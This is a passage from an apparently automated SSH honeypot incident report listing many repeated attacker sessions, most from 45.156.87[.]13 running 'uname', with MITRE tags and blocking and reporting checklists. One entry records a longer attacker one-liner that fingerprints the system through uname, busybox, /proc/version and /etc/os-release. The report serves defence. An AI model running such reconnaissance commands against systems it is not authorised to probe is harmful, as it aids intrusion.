| `2026-08-25 04:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f04c99cf86

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:26` | `cowrie.session.connect` |
| `2026-08-25 04:58:26` | `cowrie.client.version` |
| `2026-08-25 04:58:27` | `cowrie.client.kex` |
| `2026-08-25 04:58:27` | `cowrie.login.success` |
| `2026-08-25 04:58:28` | `cowrie.session.params` |
| `2026-08-25 04:58:28` | `cowrie.command.input` |
| `2026-08-25 04:58:28` | `cowrie.log.closed` |
| `2026-08-25 04:58:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-938ee022491c

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:31` | `cowrie.session.connect` |
| `2026-08-25 04:58:31` | `cowrie.client.version` |
| `2026-08-25 04:58:32` | `cowrie.client.kex` |
| `2026-08-25 04:58:32` | `cowrie.login.success` |
| `2026-08-25 04:58:33` | `cowrie.session.params` |
| `2026-08-25 04:58:33` | `cowrie.command.input` |
| `2026-08-25 04:58:33` | `cowrie.log.closed` |
| `2026-08-25 04:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa08116fe775

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:36` | `cowrie.session.connect` |
| `2026-08-25 04:58:36` | `cowrie.client.version` |
| `2026-08-25 04:58:36` | `cowrie.client.kex` |
| `2026-08-25 04:58:37` | `cowrie.login.success` |
| `2026-08-25 04:58:38` | `cowrie.session.params` |
| `2026-08-25 04:58:38` | `cowrie.command.input` |
| `2026-08-25 04:58:38` | `cowrie.log.closed` |
| `2026-08-25 04:58:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24634e72faf9

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:42` | `cowrie.session.connect` |
| `2026-08-25 04:58:42` | `cowrie.client.version` |
| `2026-08-25 04:58:42` | `cowrie.client.kex` |
| `2026-08-25 04:58:42` | `cowrie.login.success` |
| `2026-08-25 04:58:43` | `cowrie.session.params` |
| `2026-08-25 04:58:43` | `cowrie.command.input` |
| `2026-08-25 04:58:43` | `cowrie.log.closed` |
| `2026-08-25 04:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad2288c44b8d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:47` | `cowrie.session.connect` |
| `2026-08-25 04:58:47` | `cowrie.client.version` |
| `2026-08-25 04:58:47` | `cowrie.client.kex` |
| `2026-08-25 04:58:47` | `cowrie.login.success` |
| `2026-08-25 04:58:48` | `cowrie.session.params` |
| `2026-08-25 04:58:48` | `cowrie.command.input` |
| `2026-08-25 04:58:48` | `cowrie.log.closed` |
| `2026-08-25 04:58:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899d32d6662d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:52` | `cowrie.session.connect` |
| `2026-08-25 04:58:52` | `cowrie.client.version` |
| `2026-08-25 04:58:52` | `cowrie.client.kex` |
| `2026-08-25 04:58:52` | `cowrie.login.success` |
| `2026-08-25 04:58:53` | `cowrie.session.params` |
| `2026-08-25 04:58:53` | `cowrie.command.input` |
| `2026-08-25 04:58:53` | `cowrie.log.closed` |
| `2026-08-25 04:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f0ec70a279

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:58 |
| **Last Seen** | 2026-08-25 04:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:58:57` | `cowrie.session.connect` |
| `2026-08-25 04:58:57` | `cowrie.client.version` |
| `2026-08-25 04:58:57` | `cowrie.client.kex` |
| `2026-08-25 04:58:57` | `cowrie.login.success` |
| `2026-08-25 04:58:58` | `cowrie.session.params` |
| `2026-08-25 04:58:58` | `cowrie.command.input` |
| `2026-08-25 04:58:58` | `cowrie.log.closed` |
| `2026-08-25 04:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-310f66477e67

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:02` | `cowrie.session.connect` |
| `2026-08-25 04:59:02` | `cowrie.client.version` |
| `2026-08-25 04:59:02` | `cowrie.client.kex` |
| `2026-08-25 04:59:02` | `cowrie.login.success` |
| `2026-08-25 04:59:03` | `cowrie.session.params` |
| `2026-08-25 04:59:03` | `cowrie.command.input` |
| `2026-08-25 04:59:03` | `cowrie.log.closed` |
| `2026-08-25 04:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75ff0199001d

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:07` | `cowrie.session.connect` |
| `2026-08-25 04:59:07` | `cowrie.client.version` |
| `2026-08-25 04:59:07` | `cowrie.client.kex` |
| `2026-08-25 04:59:07` | `cowrie.login.success` |
| `2026-08-25 04:59:08` | `cowrie.session.params` |
| `2026-08-25 04:59:08` | `cowrie.command.input` |
| `2026-08-25 04:59:08` | `cowrie.log.closed` |
| `2026-08-25 04:59:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-239cbfc9f3b4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:12` | `cowrie.session.connect` |
| `2026-08-25 04:59:12` | `cowrie.client.version` |
| `2026-08-25 04:59:12` | `cowrie.client.kex` |
| `2026-08-25 04:59:12` | `cowrie.login.success` |
| `2026-08-25 04:59:13` | `cowrie.session.params` |
| `2026-08-25 04:59:13` | `cowrie.command.input` |
| `2026-08-25 04:59:13` | `cowrie.log.closed` |
| `2026-08-25 04:59:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff5e45b361b

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:17` | `cowrie.session.connect` |
| `2026-08-25 04:59:17` | `cowrie.client.version` |
| `2026-08-25 04:59:17` | `cowrie.client.kex` |
| `2026-08-25 04:59:17` | `cowrie.login.success` |
| `2026-08-25 04:59:18` | `cowrie.session.params` |
| `2026-08-25 04:59:18` | `cowrie.command.input` |
| `2026-08-25 04:59:18` | `cowrie.log.closed` |
| `2026-08-25 04:59:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f8f241232e

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:21` | `cowrie.session.connect` |
| `2026-08-25 04:59:21` | `cowrie.client.version` |
| `2026-08-25 04:59:21` | `cowrie.client.kex` |
| `2026-08-25 04:59:22` | `cowrie.login.success` |
| `2026-08-25 04:59:23` | `cowrie.session.params` |
| `2026-08-25 04:59:23` | `cowrie.command.input` |
| `2026-08-25 04:59:23` | `cowrie.log.closed` |
| `2026-08-25 04:59:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d9602339f4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:26` | `cowrie.session.connect` |
| `2026-08-25 04:59:26` | `cowrie.client.version` |
| `2026-08-25 04:59:26` | `cowrie.client.kex` |
| `2026-08-25 04:59:26` | `cowrie.login.success` |
| `2026-08-25 04:59:27` | `cowrie.session.params` |
| `2026-08-25 04:59:27` | `cowrie.command.input` |
| `2026-08-25 04:59:27` | `cowrie.log.closed` |
| `2026-08-25 04:59:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-114c35ff5d8f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:30` | `cowrie.session.connect` |
| `2026-08-25 04:59:30` | `cowrie.client.version` |
| `2026-08-25 04:59:31` | `cowrie.client.kex` |
| `2026-08-25 04:59:31` | `cowrie.login.success` |
| `2026-08-25 04:59:32` | `cowrie.session.params` |
| `2026-08-25 04:59:32` | `cowrie.command.input` |
| `2026-08-25 04:59:32` | `cowrie.log.closed` |
| `2026-08-25 04:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-988cee25a279

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:35` | `cowrie.session.connect` |
| `2026-08-25 04:59:35` | `cowrie.client.version` |
| `2026-08-25 04:59:35` | `cowrie.client.kex` |
| `2026-08-25 04:59:36` | `cowrie.login.success` |
| `2026-08-25 04:59:37` | `cowrie.session.params` |
| `2026-08-25 04:59:37` | `cowrie.command.input` |
| `2026-08-25 04:59:37` | `cowrie.log.closed` |
| `2026-08-25 04:59:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd862602c9a2

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:40` | `cowrie.session.connect` |
| `2026-08-25 04:59:40` | `cowrie.client.version` |
| `2026-08-25 04:59:40` | `cowrie.client.kex` |
| `2026-08-25 04:59:40` | `cowrie.login.success` |
| `2026-08-25 04:59:41` | `cowrie.session.params` |
| `2026-08-25 04:59:41` | `cowrie.command.input` |
| `2026-08-25 04:59:41` | `cowrie.log.closed` |
| `2026-08-25 04:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fbfd1215213

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:45` | `cowrie.session.connect` |
| `2026-08-25 04:59:45` | `cowrie.client.version` |
| `2026-08-25 04:59:45` | `cowrie.client.kex` |
| `2026-08-25 04:59:45` | `cowrie.login.success` |
| `2026-08-25 04:59:46` | `cowrie.session.params` |
| `2026-08-25 04:59:46` | `cowrie.command.input` |
| `2026-08-25 04:59:46` | `cowrie.log.closed` |
| `2026-08-25 04:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf367f92156

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:49` | `cowrie.session.connect` |
| `2026-08-25 04:59:49` | `cowrie.client.version` |
| `2026-08-25 04:59:49` | `cowrie.client.kex` |
| `2026-08-25 04:59:50` | `cowrie.login.success` |
| `2026-08-25 04:59:51` | `cowrie.session.params` |
| `2026-08-25 04:59:51` | `cowrie.command.input` |
| `2026-08-25 04:59:51` | `cowrie.log.closed` |
| `2026-08-25 04:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bf2871ccdf5

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:54` | `cowrie.session.connect` |
| `2026-08-25 04:59:54` | `cowrie.client.version` |
| `2026-08-25 04:59:54` | `cowrie.client.kex` |
| `2026-08-25 04:59:54` | `cowrie.login.success` |
| `2026-08-25 04:59:55` | `cowrie.session.params` |
| `2026-08-25 04:59:55` | `cowrie.command.input` |
| `2026-08-25 04:59:55` | `cowrie.log.closed` |
| `2026-08-25 04:59:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66ef3823f9d4

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 04:59 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 04:59:58` | `cowrie.session.connect` |
| `2026-08-25 04:59:58` | `cowrie.client.version` |
| `2026-08-25 04:59:59` | `cowrie.client.kex` |
| `2026-08-25 04:59:59` | `cowrie.login.success` |
| `2026-08-25 05:00:00` | `cowrie.session.params` |
| `2026-08-25 05:00:00` | `cowrie.command.input` |
| `2026-08-25 05:00:00` | `cowrie.log.closed` |
| `2026-08-25 05:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fcc6f81f884

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:03` | `cowrie.session.connect` |
| `2026-08-25 05:00:03` | `cowrie.client.version` |
| `2026-08-25 05:00:03` | `cowrie.client.kex` |
| `2026-08-25 05:00:04` | `cowrie.login.success` |
| `2026-08-25 05:00:05` | `cowrie.session.params` |
| `2026-08-25 05:00:05` | `cowrie.command.input` |
| `2026-08-25 05:00:05` | `cowrie.log.closed` |
| `2026-08-25 05:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6607fc303889

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:05` | `cowrie.session.connect` |
| `2026-08-25 05:00:05` | `cowrie.client.version` |
| `2026-08-25 05:00:05` | `cowrie.client.kex` |
| `2026-08-25 05:00:06` | `cowrie.login.success` |
| `2026-08-25 05:00:08` | `cowrie.session.params` |
| `2026-08-25 05:00:08` | `cowrie.command.input` |
| `2026-08-25 05:00:08` | `cowrie.command.input` |
| `2026-08-25 05:00:08` | `cowrie.command.input` |
| `2026-08-25 05:00:08` | `cowrie.command.input` |
| `2026-08-25 05:00:08` | `cowrie.command.input` |
| `2026-08-25 05:00:08` | `cowrie.command.success` |
| `2026-08-25 05:00:08` | `cowrie.command.input` |
| `2026-08-25 05:00:08` | `cowrie.command.input` |
| `2026-08-25 05:00:08` | `cowrie.command.input` |
| `2026-08-25 05:00:08` | `cowrie.command.input` |
| `2026-08-25 05:00:08` | `cowrie.log.closed` |
| `2026-08-25 05:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49e44ef4abfa

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:08` | `cowrie.session.connect` |
| `2026-08-25 05:00:08` | `cowrie.client.version` |
| `2026-08-25 05:00:08` | `cowrie.client.kex` |
| `2026-08-25 05:00:09` | `cowrie.login.success` |
| `2026-08-25 05:00:10` | `cowrie.session.params` |
| `2026-08-25 05:00:10` | `cowrie.command.input` |
| `2026-08-25 05:00:10` | `cowrie.log.closed` |
| `2026-08-25 05:00:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8f6e5fd733f

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:00:13` | `cowrie.session.connect` |
| `2026-08-25 05:00:13` | `cowrie.client.version` |
| `2026-08-25 05:00:13` | `cowrie.client.kex` |
| `2026-08-25 05:00:13` | `cowrie.login.success` |
| `2026-08-25 05:00:14` | `cowrie.session.params` |
| `2026-08-25 05:00:14` | `cowrie.command.input` |
| `2026-08-25 05:00:14` | `cowrie.log.closed` |
| `2026-08-25 05:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ebf9ff02d48

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-08-25 05:00 |
| **Last Seen** | 2026-08-25 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
